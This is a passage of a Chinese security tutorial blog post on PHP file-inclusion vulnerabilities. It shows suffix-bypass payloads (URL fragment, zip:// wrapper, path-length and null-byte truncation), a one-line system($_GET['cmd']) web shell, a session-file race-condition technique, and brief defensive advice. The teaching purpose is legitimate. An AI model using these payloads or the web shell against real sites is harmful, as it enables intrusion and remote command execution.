+<p>则包含的文件为 <a target="_blank" rel="noopener" href="http://remoteaddr/remoteinfo.txt#/test/test.php">http://remoteaddr/remoteinfo.txt#/test/test.php</a><br>问号后面的部分<code>/test/test.php</code>，也就是指定的后缀被当作fragment从而被绕过。注意需要把<code>#</code>进行url编码为<code>%23</code>。</p>
+<p>2.利用协议</p>
+<p>假设现在测试代码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>	<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>	<span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;/test/test.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>构造压缩包如下：</p>
+<p>其中test.php内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>利用zip协议，注意要指定绝对路径</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=zip:<span class="hljs-comment">//D:\phpStudy\WWW\fileinclude\chybeta.zip%23chybeta</span><br></code></pre></td></tr></table></figure>
+
+<p>则拼接后为：zip:&#x2F;&#x2F;D:\phpStudy\WWW\fileinclude\chybeta.zip#chybeta&#x2F;test&#x2F;test.php</p>
+<p>能成功包含。</p>
+<p>3.长度截断</p>
+<p>利用条件： php版本 &lt; php 5.2.8</p>
+<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">index.php?<span class="hljs-keyword">file</span>=.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>。。。省略。。。.<span class="hljs-regexp">/./</span>shell.txt<br></code></pre></td></tr></table></figure>
+
+
+
+<p>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
+<p>4.0字节截断</p>
+<p>利用条件： php版本 &lt; php 5.3.4</p>
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=phpinfo.txt<span class="hljs-number">%00</span><br></code></pre></td></tr></table></figure>
+
+<p>能利用00截断的场景现在应该很少了：）</p>
+<h3>写入内容进行修改</h3>
+
+<p>为了防止写入内容被利用，有时会将写入的内容符号进行编码，对内容进行反序列化甚至直接编码，这就导致了我们时候写入文件也可以包含但无法成功。例如<code>&amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;</code>或者会关闭短标签<code>&lt;? system($_GET[&#39;cmd&#39;]); ?&gt;</code>，这些情况下我们写入的代码就会失效。</p>
+<p>这种情况下我们可以考虑利用条件竞争，毕竟对文件内容进行操作和写入文件是两步操作，中间肯定存在窗口的。拿session文件来举例吧：</p>
+<p>正常流程是<code>请求开始 → 写入$_SESSION → 请求结束 → 写入session文件</code>上面提到的操作都是在写入文件那一步才进行的，我们此时可以尝试用条件竞争来include文件，同时传两个包，一个给SESSION参数赋值的请求，一个读取文件的请求，此时可能会让我们读到刚开始写入文件的内容即我们赋值的原数据，就可以按照正常的php代码执行了</p>
+<h2>五.如何防御</h2>
+
+<p>1.若是不会影响功能需求，php可配置open_basedir，现在文件包含只能限制在具体目录下，可防止攻击者随意读取任意目录下的文件</p>
+<p>2.做好文件的权限管理</p>
+<p>3.对危险字符进行过滤</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web/" class="category-chain-item">web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="print-no-link">#文件包含</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>OWTOP10芝文件包含</div>
+      <div>http://blog.yunli1.com/2026/04/23/OWTOP10芝文件包含/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>yunli</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/05/23/%E4%BB%8E%E5%B0%8F%E7%99%BD%E5%BC%80%E5%A7%8B%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6/" title="从小白开始竞争条件">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">从小白开始竞争条件</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/02/14/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E4%BB%8E0%E5%88%B01%E5%AD%A6%E4%B9%A0PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="一篇文章从0到1学习PHP反序列化">
+                        <span class="hidden-mobile">一篇文章从0到1学习PHP反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo ⭐</span></a> <a href="https://blog.yunli1.com/" target="_blank" rel="nofollow noopener"><span>yunli</span></a> <br> <span>主题</span> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>fluid</span></a> <br> <span id="busuanzi_container_site_pv">总访问量：<span id="busuanzi_value_site_pv"></span> 次</span> <br> <span id="busuanzi_container_site_uv">访客数：<span id="busuanzi_value_site_uv"></span> 人</span> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
